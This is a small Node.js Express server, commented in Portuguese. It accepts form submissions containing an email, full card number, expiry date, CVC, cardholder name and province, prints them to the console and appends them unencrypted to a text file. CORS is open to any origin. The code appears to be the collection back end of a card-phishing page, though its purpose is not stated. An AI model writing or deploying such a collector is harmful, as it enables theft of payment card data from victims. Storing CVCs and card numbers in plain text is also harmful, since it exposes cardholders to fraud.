const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs'); // <- Aqui importamos o módulo de arquivos do Node

const app = express();
const PORT = 3000;

// Configurações
app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Rota para receber dados do formulário
app.post('/enviar', (req, res) => {
  console.log('Dados recebidos:');
  console.log(req.body);

  // Montar os dados formatados
  const dadosFormatados = `
======== NOVO ENVIO ========
E-mail: ${req.body.Email}
Número do Cartão: ${req.body.Numero_Cartao}
Validade: ${req.body.Validade}
CVC: ${req.body.CVC}
Nome do Titular: ${req.body.Titular}
Província: ${req.body.Provincia}
============================
`;

  // Salvar no arquivo 'dados.txt'
  fs.appendFile('dados.txt', dadosFormatados, (err) => {
    if (err) {
      console.error('Erro ao salvar os dados:', err);
      return res.status(500).send('Erro ao salvar os dados');
    }
    console.log('Dados salvos em dados.txt!');
    res.send('Formulário enviado e salvo com sucesso!');
  });
});

// Teste de rota inicial
app.get('/', (req, res) => {
  res.send('Servidor rodando corretamente!');
});

// Iniciar o servidor
app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
